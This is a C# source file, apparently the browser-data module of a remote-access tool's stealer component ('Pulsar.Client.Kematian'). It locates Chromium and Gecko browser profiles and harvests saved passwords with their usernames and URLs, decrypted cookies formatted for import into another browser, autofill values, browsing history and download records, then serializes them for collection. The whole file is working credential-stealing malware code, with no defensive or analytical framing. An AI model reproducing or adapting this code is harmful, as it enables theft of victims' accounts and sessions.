using Pulsar.Client.Kematian.Browsers.Chromium.Autofill;
using Pulsar.Client.Kematian.Browsers.Chromium.Cookies;
using Pulsar.Client.Kematian.Browsers.Chromium.Downloads;
using Pulsar.Client.Kematian.Browsers.Chromium.History;
using Pulsar.Client.Kematian.Browsers.Chromium.Passwords;
using Pulsar.Client.Kematian.Browsers.Gecko.Cookies;
using Pulsar.Client.Kematian.Browsers.Gecko.History;
using Pulsar.Client.Kematian.Browsers.Gecko.Passwords;
using Pulsar.Client.Kematian.Browsers.Helpers;
using Pulsar.Client.Kematian.Browsers.Helpers.JSON;
using Pulsar.Client.Kematian.Browsers.Helpers.Structs;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

namespace Pulsar.Client.Kematian.Browsers
{
    public class BrowsersRetriever
    {
        private readonly List<BrowserChromium> _chromiumBrowsers;
        private readonly List<BrowserGecko> _geckoBrowsers;

        public BrowsersRetriever()
        {
            Crawler crawler = new Crawler();

            var foundBrowsers = crawler.FindAllBrowsers();

            _chromiumBrowsers = new List<BrowserChromium>(foundBrowsers.Chromium)
                .OrderBy(b => b.Name)
                .ThenBy(b => b.Path)
                .ToList();
                
            _geckoBrowsers = new List<BrowserGecko>(foundBrowsers.Gecko)
                .OrderBy(b => b.Name)
                .ThenBy(b => b.Path)
                .ToList();

            Debug.WriteLine($"Found {_chromiumBrowsers.Count} Chromium browsers");
            Debug.WriteLine($"Found {_geckoBrowsers.Count} Gecko browsers");
        }

        public Dictionary<string, string> GetBrowserInfo()
        {
            var browserInfo = new Dictionary<string, string>();
            
            foreach (var browser in _chromiumBrowsers.OrderBy(b => b.Name))
            {
                string browserName = browser.Name;
                if (!string.IsNullOrEmpty(browserName) && !browserInfo.ContainsKey(browserName))
                {
                    browserInfo.Add(browserName, browser.Path);
                }
            }
            
            foreach (var browser in _geckoBrowsers.OrderBy(b => b.Name))
            {
                string browserName = browser.Name;
                if (!string.IsNullOrEmpty(browserName) && !browserInfo.ContainsKey(browserName))
                {
                    browserInfo.Add(browserName, browser.Path);
                }
            }
            
            if (browserInfo.Count == 0)
            {
                browserInfo.Add("Default", string.Empty);
            }
            
            return browserInfo
                .OrderBy(kvp => kvp.Key)
                .ToDictionary(kvp => kvp.Key, kvp => kvp.Value);
        }


        public string GetHistoryForBrowser(string browserName)
        {
            try
            {
                var allHistory = new List<Dictionary<string, string>>();

                var chromiumBrowser = _chromiumBrowsers.FirstOrDefault(b => b.Name.Equals(browserName, StringComparison.OrdinalIgnoreCase));
                if (chromiumBrowser.Name != null)
                {
                    var chromiumHistoryTasks = new List<Task<List<Dictionary<string, string>>>>();
                    foreach (var profile in chromiumBrowser.Profiles)
                    {
                        chromiumHistoryTasks.Add(Task.Run(() => GetChromiumHistoryForProfile(profile)));
                    }

                    Task.WaitAll(chromiumHistoryTasks.ToArray());

                    foreach (var task in chromiumHistoryTasks)
                    {
                        allHistory.AddRange(task.Result);
                    }

                    return allHistory.Count > 1000
                        ? Serializer.SerializeDataInBatches(allHistory, 1000)
                        : Serializer.SerializeData(allHistory);
                }

                var geckoBrowser = _geckoBrowsers.FirstOrDefault(b => b.Name.Equals(browserName, StringComparison.OrdinalIgnoreCase));
                if (geckoBrowser.Name != null)
                {
                    var history = GetGeckoHistoryForProfile(geckoBrowser);
                    allHistory.AddRange(history);

                    return allHistory.Count > 1000
                        ? Serializer.SerializeDataInBatches(allHistory, 1000)
                        : Serializer.SerializeData(allHistory);
                }

                return "[]";
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error retrieving history for {browserName}: {ex.Message}");
                return "[]";
            }
        }

        public string GetAutoFillDataForBrowser(string browserName)
        {
            try
            {
                var allAutoFillData = new List<Dictionary<string, string>>();
                
                var chromiumBrowser = _chromiumBrowsers.FirstOrDefault(b => b.Name.Equals(browserName, StringComparison.OrdinalIgnoreCase));
                if (chromiumBrowser.Name != null)
                {
                    var autoFillTasks = new List<Task<List<Dictionary<string, string>>>>();

                    foreach (var profile in chromiumBrowser.Profiles)
                    {
                        autoFillTasks.Add(Task.Run(() => GetChromiumAutofillForProfile(profile)));
                    }

                    Task.WaitAll(autoFillTasks.ToArray());

                    foreach (var task in autoFillTasks)
                    {
                        allAutoFillData.AddRange(task.Result);
                    }

                    return allAutoFillData.Count > 1000
                        ? Serializer.SerializeDataInBatches(allAutoFillData, 1000)
                        : Serializer.SerializeData(allAutoFillData);
                }

                return "[]";
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error retrieving autofill data for {browserName}: {ex.Message}");
                return "[]";
            }
        }

        public string GetCookiesForBrowser(string browserName)
        {
            try
            {
                var allCookies = new List<string>();
                
                var chromiumBrowser = _chromiumBrowsers.FirstOrDefault(b => b.Name.Equals(browserName, StringComparison.OrdinalIgnoreCase));
                if (chromiumBrowser.Name != null)
                {
                    var cookieTasks = new List<Task<List<string>>>();

                    foreach (var profile in chromiumBrowser.Profiles)
                    {
                        cookieTasks.Add(Task.Run(() => GetChromiumCookiesForProfile(profile, chromiumBrowser.LocalState)));
                    }

                    Task.WaitAll(cookieTasks.ToArray());

                    foreach (var task in cookieTasks)
                    {
                        allCookies.AddRange(task.Result);
                    }

                    return string.Join(Environment.NewLine, allCookies);
                }

                var geckoBrowser = _geckoBrowsers.FirstOrDefault(b => b.Name.Equals(browserName, StringComparison.OrdinalIgnoreCase));
                if (geckoBrowser.Name != null)
                {
                    var cookies = GetGeckoCookiesForProfile(geckoBrowser);
                    allCookies.AddRange(cookies);
                    
                    return string.Join(Environment.NewLine, allCookies);
                }

                return string.Empty;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error retrieving cookies for {browserName}: {ex.Message}");
                return string.Empty;
            }
        }

        public string GetDownloadsForBrowser(string browserName)
        {
            try
            {
                var allDownloads = new List<Dictionary<string, string>>();
                
                var chromiumBrowser = _chromiumBrowsers.FirstOrDefault(b => b.Name.Equals(browserName, StringComparison.OrdinalIgnoreCase));
                if (chromiumBrowser.Name != null)
                {
                    var downloadTasks = new List<Task<List<Dictionary<string, string>>>>();

                    foreach (var profile in chromiumBrowser.Profiles)
                    {
                        downloadTasks.Add(Task.Run(() => GetChromiumDownloadsForProfile(profile)));
                    }

                    Task.WaitAll(downloadTasks.ToArray());

                    foreach (var task in downloadTasks)
                    {
                        allDownloads.AddRange(task.Result);
                    }

                    return allDownloads.Count > 1000
                        ? Serializer.SerializeDataInBatches(allDownloads, 1000)
                        : Serializer.SerializeData(allDownloads);
                }

                return "[]";
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error retrieving downloads for {browserName}: {ex.Message}");
                return "[]";
            }
        }

        public string GetPasswordsForBrowser(string browserName)
        {
            try
            {
                var allPasswords = new List<Dictionary<string, string>>();
                
                var chromiumBrowser = _chromiumBrowsers.FirstOrDefault(b => b.Name.Equals(browserName, StringComparison.OrdinalIgnoreCase));
                if (chromiumBrowser.Name != null)
                {
                    var passwordTasks = new List<Task<List<Dictionary<string, string>>>>();

                    foreach (var profile in chromiumBrowser.Profiles)
                    {
                        if (profile.LoginData == null || !File.Exists(profile.LoginData) || string.IsNullOrEmpty(chromiumBrowser.LocalState))
                            continue;

                        passwordTasks.Add(Task.Run(() => GetChromiumPasswordsForProfile(profile, chromiumBrowser.LocalState)));
                    }

                    if (passwordTasks.Count > 0)
                    {
                        Task.WaitAll(passwordTasks.ToArray());

                        foreach (var task in passwordTasks)
                        {
                            if (task != null && task.Result != null)
                            {
                                allPasswords.AddRange(task.Result);
                            }
                        }
                    }
                }


                var geckoBrowser = _geckoBrowsers.FirstOrDefault(b => b.Name.Equals(browserName, StringComparison.OrdinalIgnoreCase));
                if (geckoBrowser.Name != null)
                {
                    if (geckoBrowser.Path != null && Directory.Exists(geckoBrowser.Path))
                    {
                        List<Dictionary<string, string>> geckoPasswords = null;
                        try
                        {
                            geckoPasswords = GetGeckoPasswordsForProfile(geckoBrowser);
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error processing Gecko passwords for {browserName}: {ex.Message}");
                        }
                        if (geckoPasswords != null)
                        {
                            allPasswords.AddRange(geckoPasswords);
                        }
                    }
                }

                return allPasswords.Count > 1000
                    ? Serializer.SerializeDataInBatches(allPasswords, 1000)
                    : Serializer.SerializeData(allPasswords);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error retrieving passwords for {browserName}: {ex.Message}");
                return "[]";
            }
        }


        public string GetHistory()
        {
            try
            {
                var allHistory = new List<Dictionary<string, string>>();

                var chromiumHistoryTasks = new List<Task<List<Dictionary<string, string>>>>();
                foreach (var browser in _chromiumBrowsers)
                {
                    foreach (var profile in browser.Profiles)
                    {
                        chromiumHistoryTasks.Add(Task.Run(() => GetChromiumHistoryForProfile(profile)));
                    }
                }

                var geckoHistoryTasks = new List<Task<List<Dictionary<string, string>>>>();
                foreach (var browser in _geckoBrowsers)
                {
                    geckoHistoryTasks.Add(Task.Run(() => GetGeckoHistoryForProfile(browser)));
                }

                Task.WaitAll(chromiumHistoryTasks.ToArray());
                Task.WaitAll(geckoHistoryTasks.ToArray());

                foreach (var task in chromiumHistoryTasks)
                {
                    allHistory.AddRange(task.Result);
                }

                foreach (var task in geckoHistoryTasks)
                {
                    allHistory.AddRange(task.Result);
                }

                return allHistory.Count > 1000
                    ? Serializer.SerializeDataInBatches(allHistory, 1000)
                    : Serializer.SerializeData(allHistory);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error retrieving history: {ex.Message}");
                return "[]";
            }
        }

        public string GetAutoFillData()
        {
            try
            {
                var allAutoFillData = new List<Dictionary<string, string>>();
                var autoFillTasks = new List<Task<List<Dictionary<string, string>>>>();

                foreach (var browser in _chromiumBrowsers)
                {
                    foreach (var profile in browser.Profiles)
                    {
                        autoFillTasks.Add(Task.Run(() => GetChromiumAutofillForProfile(profile)));
                    }
                }

                Task.WaitAll(autoFillTasks.ToArray());

                foreach (var task in autoFillTasks)
                {
                    allAutoFillData.AddRange(task.Result);
                }

                return allAutoFillData.Count > 1000
                    ? Serializer.SerializeDataInBatches(allAutoFillData, 1000)
                    : Serializer.SerializeData(allAutoFillData);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error retrieving autofill data: {ex.Message}");
                return "[]";
            }
        }

        public string GetCookies()
        {
            try
            {
                var allCookies = new List<string>();
                var cookieTasks = new List<Task<List<string>>>();

                foreach (var browser in _chromiumBrowsers)
                {
                    foreach (var profile in browser.Profiles)
                    {
                        cookieTasks.Add(Task.Run(() => GetChromiumCookiesForProfile(profile, browser.LocalState)));
                    }
                }

                Task.WaitAll(cookieTasks.ToArray());

                foreach (var task in cookieTasks)
                {
                    allCookies.AddRange(task.Result);
                }

                foreach (var browser in _geckoBrowsers)
                {
                    var geckoCookies = GetGeckoCookiesForProfile(browser);
                    allCookies.AddRange(geckoCookies);
                }

                return string.Join(Environment.NewLine, allCookies);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error retrieving cookies: {ex.Message}");
                return string.Empty;
            }
        }

        public string GetDownloads()
        {
            try
            {
                var allDownloads = new List<Dictionary<string, string>>();
                var downloadTasks = new List<Task<List<Dictionary<string, string>>>>();

                foreach (var browser in _chromiumBrowsers)
                {
                    foreach (var profile in browser.Profiles)
                    {
                        downloadTasks.Add(Task.Run(() => GetChromiumDownloadsForProfile(profile)));
                    }
                }

                Task.WaitAll(downloadTasks.ToArray());

                foreach (var task in downloadTasks)
                {
                    allDownloads.AddRange(task.Result);
                }

                return allDownloads.Count > 1000
                    ? Serializer.SerializeDataInBatches(allDownloads, 1000)
                    : Serializer.SerializeData(allDownloads);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error retrieving downloads: {ex.Message}");
                return "[]";
            }
        }

        public string GetPasswords()
        {
            try
            {
                var allPasswords = new List<Dictionary<string, string>>();
                var passwordTasks = new List<Task<List<Dictionary<string, string>>>>();

                foreach (var browser in _chromiumBrowsers)
                {
                    foreach (var profile in browser.Profiles)
                    {
                        if (profile.LoginData == null || !File.Exists(profile.LoginData) || string.IsNullOrEmpty(browser.LocalState))
                            continue;

                        passwordTasks.Add(Task.Run(() => GetChromiumPasswordsForProfile(profile, browser.LocalState)));
                    }
                }

                if (passwordTasks.Count > 0)
                {
                    Task.WaitAll(passwordTasks.ToArray());

                    foreach (var task in passwordTasks)
                    {
                        if (task != null && task.Result != null)
                        {
                            allPasswords.AddRange(task.Result);
                        }
                    }
                }

                foreach (var browser in _geckoBrowsers)
                {
                        if (browser.Path == null || !Directory.Exists(browser.Path))
                            continue;

                        List<Dictionary<string, string>> geckoPasswords = null;
                        try
                        {
                            geckoPasswords = GetGeckoPasswordsForProfile(browser);
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error processing Gecko passwords for profile {browser.Name}: {ex.Message}");
                        }
                        if (geckoPasswords != null)
                        {
                            allPasswords.AddRange(geckoPasswords);
                        }
                }

                return allPasswords.Count > 1000
                    ? Serializer.SerializeDataInBatches(allPasswords, 1000)
                    : Serializer.SerializeData(allPasswords);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error retrieving passwords: {ex.Message}");
                return "[]";
            }
        }

        private List<Dictionary<string, string>> GetChromiumHistoryForProfile(ProfileChromium profile)
        {
            var result = new List<Dictionary<string, string>>();
            try
            {
                if (profile.History != null && System.IO.File.Exists(profile.History))
                {
                    var history = HistoryChromium.GetHistoryChromium(profile.History);
                    foreach (var entry in history)
                    {
                        var newEntry = new Dictionary<string, string>
                            {
                                {"Url", entry.Url},
                                {"Title", entry.Title},
                                {"Visit_count", entry.VisitCount},
                                {"Last_visit", entry.LastVisitTime}
                            };
                        result.Add(newEntry);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing Chromium history for profile {profile.Name}: {ex.Message}");
            }
            return result;
        }

        private List<Dictionary<string, string>> GetGeckoHistoryForProfile(BrowserGecko profile)
        {
            var result = new List<Dictionary<string, string>>();
            try
            {
                if (profile.History != null && System.IO.File.Exists(profile.History))
                {
                    var history = HistoryGecko.GetHistoryGecko(profile.History);
                    foreach (var entry in history)
                    {
                        var newEntry = new Dictionary<string, string>
                            {
                                {"Url", entry.Url},
                                {"Title", entry.Title},
                                {"VisitCount", entry.VisitCount},
                                {"Date Last Viewed", entry.LastVisitTime}
                            };
                        result.Add(newEntry);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing Gecko history for profile {profile.Name}: {ex.Message}");
            }
            return result;
        }

        private List<Dictionary<string, string>> GetChromiumAutofillForProfile(ProfileChromium profile)
        {
            var result = new List<Dictionary<string, string>>();
            try
            {
                if (profile.WebData != null && System.IO.File.Exists(profile.WebData))
                {
                    var autoFillData = Autofill.GetAutofillEntries(profile.WebData);
                    foreach (var entry in autoFillData)
                    {
                        var newEntry = new Dictionary<string, string>
                            {
                                {"Name", entry.Name},
                                {"Value", entry.Value},
                                {"Value_lower", entry.Value_lower},
                                {"Date_created", entry.Date_created},
                                {"Date_last_used", entry.Date_last_used},
                                {"Count", entry.Count}
                            };
                        result.Add(newEntry);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing Chromium autofill for profile {profile.Name}: {ex.Message}");
            }
            return result;
        }

        private List<string> GetChromiumCookiesForProfile(ProfileChromium profile, string localStatePath)
        {
            var result = new List<string>();
            try
            {
                if (profile.Cookies != null && System.IO.File.Exists(profile.Cookies))
                {
                    var cookies = CookiesChromium.GetCookies(profile.Cookies, localStatePath);
                    foreach (var cookie in cookies)
                    {
                        var netscapeCookie = $"{cookie.HostKey}\tTRUE\t{cookie.Path}\tFALSE\t{cookie.ExpiresUTC}\t{cookie.Name}\t{cookie.Value}";
                        result.Add(netscapeCookie);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing Chromium cookies for profile {profile.Name}: {ex.Message}");
            }
            return result;
        }

        private List<Dictionary<string, string>> GetChromiumDownloadsForProfile(ProfileChromium profile)
        {
            var result = new List<Dictionary<string, string>>();
            try
            {
                if (profile.History != null && System.IO.File.Exists(profile.History))
                {
                    var downloads = DownloadsChromium.GetDownloadsChromium(profile.History);
                    foreach (var entry in downloads)
                    {
                        var newEntry = new Dictionary<string, string>
                            {
                                {"CurrentPath", entry.Current_path },
                                {"TargetPath", entry.Target_path },
                                {"StartTime", entry.Start_time },
                                {"ReceivedBytes", entry.Received_bytes },
                                {"TotalBytes", entry.Total_bytes },
                                {"DangerType", entry.Danger_type },
                                {"EndTime", entry.End_time },
                                {"Opened", entry.Opened },
                                {"LastAccessTime", entry.Last_access_time },
                                {"Referrer", entry.Referrer },
                                {"TabUrl", entry.Tab_url },
                                {"TabReferrerUrl", entry.Tab_referrer_url },
                                {"MimeType", entry.Mime_type },
                                {"OriginalMimeType", entry.Original_mime_type }
                            };
                        result.Add(newEntry);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing Chromium downloads for profile {profile.Name}: {ex.Message}");
            }
            return result;
        }

        private List<Dictionary<string, string>> GetChromiumPasswordsForProfile(ProfileChromium profile, string localStatePath)
        {
            var result = new List<Dictionary<string, string>>();
            try
            {
                if (profile.LoginData != null && System.IO.File.Exists(profile.LoginData))
                {
                    Debug.WriteLine($"Processing passwords for profile: {profile.Name}, LoginData: {profile.LoginData}");
                    var passwords = PasswordsChromium.GetLogins(profile.LoginData, localStatePath);
                    foreach (var entry in passwords)
                    {
                        var newEntry = new Dictionary<string, string>
                            {
                                {"Url", entry.Url},
                                {"Username", entry.Username},
                                {"Password", entry.Password}
                            };
                        result.Add(newEntry);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing Chromium passwords for profile {profile.Name}: {ex.Message}");
            }
            return result;
        }

        private List<Dictionary<string, string>> GetGeckoPasswordsForProfile(BrowserGecko profile)
        {
            var result = new List<Dictionary<string, string>>();
            bool signonsFound = false;
            bool loginsFound = false;

            string[] signons = Directory.GetFiles(profile.Path, "signons.sqlite");
            if (signons.Length > 0)
            {
                signonsFound = true;
            }

            string[] files = Directory.GetFiles(profile.Path, "logins.json");
            if (files.Length > 0)
            {
                loginsFound = true;
            }

            if (loginsFound || signonsFound)
            {
                var geckoLogins = new PasswordsGecko();
                var passwords = geckoLogins.GetLogins(profile.Path, profile.Logins, signonsFound ? signons[0] : null);
                geckoLogins.Dispose();

                foreach (var entry in passwords)
                {
                    var newEntry = new Dictionary<string, string>
                    {
                        {"Url", entry.Url},
                        {"Username", entry.Username},
                        {"Password", entry.Password}
                    };
                    result.Add(newEntry);
                }
            }
            return result;
        }

        private List<string> GetGeckoCookiesForProfile(BrowserGecko profile)
        {
            var result = new List<string>();
            try
            {
                if (profile.Cookies != null && System.IO.File.Exists(profile.Cookies))
                {
                    var cookies = CookiesGecko.GetCookies(profile.Cookies);
                    foreach (var cookie in cookies)
                    {
                        var netscapeCookie = $"{cookie.HostKey}\tTRUE\t{cookie.Path}\tFALSE\t{cookie.ExpiresUTC}\t{cookie.Name}\t{cookie.Value}";
                        result.Add(netscapeCookie);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing Gecko cookies for profile {profile.Name}: {ex.Message}");
            }
            return result;
        }
    }
}